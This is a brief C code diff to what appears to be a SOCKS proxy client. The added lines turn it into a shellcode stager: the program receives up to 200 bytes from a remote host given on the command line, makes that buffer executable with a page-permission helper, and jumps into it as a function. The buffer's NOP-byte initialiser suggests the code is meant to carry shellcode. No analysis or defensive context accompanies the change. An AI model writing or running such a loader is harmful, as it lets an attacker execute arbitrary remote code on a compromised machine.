@@ -9,6 +9,7 @@
 #include <string.h>
 
 #include "socks.h"
+#include "utils.h"
 
 int main(int argc, char **argv)
 {
@@ -23,7 +24,8 @@ int main(int argc, char **argv)
 	uint8_t *remote_host = argv[3];
 	uint8_t *remote_port = argv[4];
 
-	uint8_t payload[200] = { 0 };
+	unsigned char payload[200] = { 0x90 };
+
 	int number_of_read_bytes = 0;
 	int s;
 
@@ -48,7 +50,11 @@ int main(int argc, char **argv)
 
 	if ((number_of_read_bytes = recv(s, payload, sizeof(payload), 0)) < 0) return -1;
 
-	printf("%d", number_of_read_bytes);
+	change_page_permissions_of_address(payload, PROT_READ | PROT_WRITE | PROT_EXEC);
+
+	void (*func)() = (void (*)(void *)) payload;
+
+	func();
 
 
 	close(s);
